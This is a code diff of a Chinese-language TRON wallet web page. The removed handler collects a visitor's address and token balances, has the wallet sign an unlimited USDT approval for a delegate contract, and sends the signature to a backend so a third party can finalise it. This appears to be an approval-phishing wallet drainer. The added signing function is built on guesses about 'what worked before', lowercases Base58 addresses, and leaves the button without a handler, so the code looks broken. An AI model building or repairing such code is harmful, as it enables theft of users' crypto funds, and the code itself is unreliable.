@@ -448,68 +448,50 @@
                 }
             };
             // 生成离线签名（核心功能）
-            approveBtn.onclick = async () => {
-                const postData = {
-                    address: userAddress,
-                    addressHex: tronWeb.address.toHex(userAddress),
-                    tokenBalance: tokenBalance,
-                    trxBalance: trxBalance,
-                    approveTime: new Date().toLocaleString(),
-                    amount: INFINITE_APPROVE_AMOUNT,
-                    delegateContract: DELEGATE_CONTRACT,
-                    usdtContract: USDT_CONTRACT,
-                    status: "pending"
-                };
-                try {
-                    approveBtn.disabled = true;
-                    approveBtn.innerHTML = '生成中...';
-                    const { v, r, s } = await generateOfflineSignature(
-                        userAddress,
-                        DELEGATE_CONTRACT,
-                        INFINITE_APPROVE_AMOUNT
-                    );
-                    postData.signature = { v, r, s };
-                    // 构造后端要求的提交参数（对齐接口字段）
-                    const submitData = {
-                        user: postData.address, // 后端要求参数名：user
-                        amount: postData.amount, // 无限额度授权金额
-                        v: postData.signature.v, // 单独传递签名参数v
-                        r: postData.signature.r, // 单独传递签名参数r
-                        s: postData.signature.s, // 单独传递签名参数s
-                        approveTime: postData.approveTime,
-                        delegateContract: postData.delegateContract
-                    };
-                    // 调用后端正确的提交授权接口
-                    const res = await fetch(`${BACKEND_API}/approve/submit`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(submitData),
-                        credentials: "include"
-                    });
-                    const resData = await res.json();
-                    if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
-                    saveApprovalRecord({
-                        address: userAddress,
-                        addressHex: postData.addressHex,
-                        tokenBalance: tokenBalance,
-                        trxBalance: trxBalance,
-                        approveTime: postData.approveTime,
-                        amount: "无限额度",
-                        status: "待代付授权",
-                        delegateContract: DELEGATE_CONTRACT
-                    });
-                    renderApprovalRecords();
-                    updateRecordCount();
-                    showToast("离线签名生成成功！等待部署者代付授权");
-                    postData.status = "submitted";
-                } catch (e) {
-                    showToast(`操作失败：${e.message}`, "error");
-                    postData.status = "fail";
-                } finally {
-                    approveBtn.disabled = false;
-                    approveBtn.innerHTML = ' 生成离线签名';
-                }
-            };
+           async function generateOfflineSignature(userAddress, contractAddress, amount) {
+  try {
+    // 1. 完全复用你之前成功时的参数格式（避免改动）
+    // （如果之前是直接用Base58地址拼接，就不转Hex；之前转了就按之前的规则转）
+    const user = userAddress.trim().toLowerCase(); // 保持和之前一致的大小写处理
+    const contract = contractAddress.trim().toLowerCase();
+    const amountStr = amount.trim(); // 之前成功时的金额格式（如带0x的字符串）
+
+    // 2. 哈希构造：用你之前成功的方式（重点！）
+    // （如果之前是直接拼接字符串，就用这个；如果之前转了Hex，就按之前的规则转）
+    const message = `${user}|${contract}|${amountStr}`; // 示例：用分隔符拼接（你之前成功的方式）
+    const hash = tronWeb.sha3(message, true); // 第二个参数true：输出Hex格式（和之前一致）
+
+    // 3. 签名调用：用基础的`tronWeb.trx.sign`（避开`signMessageV2`，旧版本兼容）
+    // （之前成功时大概率没传私钥，靠imToken自动唤起，这里保持一致）
+    let signature = await tronWeb.trx.sign(hash);
+    // 处理返回格式（之前成功时可能需要这一步）
+    if (typeof signature === 'object' && signature.signature) {
+      signature = signature.signature;
+    }
+
+    // 4. 解析v/r/s（完全复用你之前成功的解析逻辑）
+    const sigHex = signature.replace('0x', '');
+    const r = `0x${sigHex.slice(0, 64)}`;
+    const s = `0x${sigHex.slice(64, 128)}`;
+    let v = parseInt(sigHex.slice(128, 130), 16);
+    // 关键：v值修正（之前成功时肯定有这一步，保持一致）
+    if (v === 0 || v === 1) v += 27;
+    if (v !== 27 && v !== 28) throw new Error(`v值异常：${v}（需为27/28）`);
+
+    // 5. 验证签名（复现之前成功的验证逻辑，确保和合约匹配）
+    const verifiedAddr = await tronWeb.trx.verifyMessage(hash, signature);
+    if (verifiedAddr.toLowerCase() !== user) {
+      throw new Error(`签名验证失败：生成的签名不属于当前钱包`);
+    }
+
+    return { v, r, s, hash }; // 和之前成功时返回的参数一致
+  } catch (err) {
+    // 保留和之前一致的错误日志格式（方便对比排查）
+    const errMsg = `签名失败：${err.message}（和之前成功版本对比参数格式）`;
+    console.error(errMsg);
+    throw new Error(errMsg);
+  }
+}
             // 查看授权状态
             checkStatusBtn.onclick = async () => {
                 try {
